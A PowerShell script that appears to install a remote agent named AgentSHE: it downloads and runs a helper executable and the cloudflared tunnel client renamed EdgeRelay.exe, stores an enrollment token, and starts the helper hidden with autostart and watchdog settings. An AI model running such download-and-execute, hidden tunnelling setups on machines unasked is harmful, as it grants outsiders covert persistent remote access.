$ErrorActionPreference = 'Stop'
if (-not $Enroll) { $Enroll = $env:AGENTSHE_ENROLL }
if (-not $BotBase) { $BotBase = $env:AGENTSHE_BOT_BASE }
if (-not $Enroll) { throw 'Enroll manquant' }
if (-not $BotBase) { throw 'BotBase manquant' }
$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/latest/download' }
$BotBase = $BotBase.TrimEnd('/')
$Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
$Cache = Join-Path $env:TEMP 'HelperHostCache'
New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

function Restore-OrFetch([string]$Name, [string]$Url) {
  $dest = Join-Path $Dir $Name
  $cached = Join-Path $Cache $Name
  if (Test-Path $dest) { Copy-Item $dest $cached -Force -ErrorAction SilentlyContinue; return }
  if (Test-Path $cached) { Copy-Item $cached $dest -Force; return }
  $part = Join-Path $Cache ($Name + '.download')
  Write-Host ("prep " + $Name + "…")
  Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $part
  Copy-Item $part $cached -Force
  Copy-Item $cached $dest -Force
}

Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
Restore-OrFetch 'EdgeRelay.exe' 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'

@{ enroll = $Enroll; bot_base = $BotBase } | ConvertTo-Json | Set-Content -Encoding UTF8 (Join-Path $Dir 'config.json')
$env:AGENTSHE_ENROLL = $Enroll
$env:AGENTSHE_BOT_BASE = $BotBase
$Helper = Join-Path $Dir 'HelperHost.exe'
$log = Join-Path $Dir 'boot.log'
$err = Join-Path $Dir 'boot.err'
if (Test-Path $log) { Remove-Item $log -Force -ErrorAction SilentlyContinue }
if (Test-Path $err) { Remove-Item $err -Force -ErrorAction SilentlyContinue }
Start-Process -WindowStyle Hidden -FilePath $Helper -WorkingDirectory $Dir -RedirectStandardOutput $log -RedirectStandardError $err
$ok = $false
for ($i=0; $i -lt 180; $i++) {
  Start-Sleep -Seconds 1
  $txt = ''
  if (Test-Path $log) { $txt += (Get-Content $log -Raw -ErrorAction SilentlyContinue) }
  if (Test-Path $err) { $txt += "`n" + (Get-Content $err -Raw -ErrorAction SilentlyContinue) }
  if ($txt -match '(?m)^OK$') {
    Select-String -Path $log,$err -Pattern '^(OK|agent=|autostart=|reboot=|watchdog=|proc_|deps=)' -ErrorAction SilentlyContinue | ForEach-Object { $_.Line }
    $ok = $true; break
  }
  if ($txt -match 'FAIL') { Write-Output $txt; throw 'install failed' }
}
if (-not $ok) { throw 'timeout' }
